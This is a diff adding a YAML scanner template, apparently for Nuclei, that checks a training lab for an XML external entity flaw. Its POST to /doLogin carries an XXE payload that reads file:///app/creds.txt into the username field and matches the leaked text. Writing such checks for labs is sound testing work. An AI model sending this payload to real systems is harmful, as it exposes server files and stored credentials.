@@ -1,0 +1,32 @@
+id: xxe
+
+info:
+  name: Check SidneyJob and cherepawwka lab
+  author: SidneyJob
+  severity: low
+  description: Check correct xxe page
+
+http:
+  - raw:
+    - |
+      GET / HTTP/2
+      Host: {{Hostname}}
+
+    - |
+      POST /doLogin HTTP/2
+      Host: {{Hostname}}
+      Content-Type: application/xml;charset=utf-8
+
+      <?xml version="1.0" standalone="yes"?>
+      <!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///app/creds.txt" > ]>
+      <user>
+      <username>&xxe;</username><password>f</password></user>
+
+
+    cookie-reuse: true
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "My uncrackable creds"
+
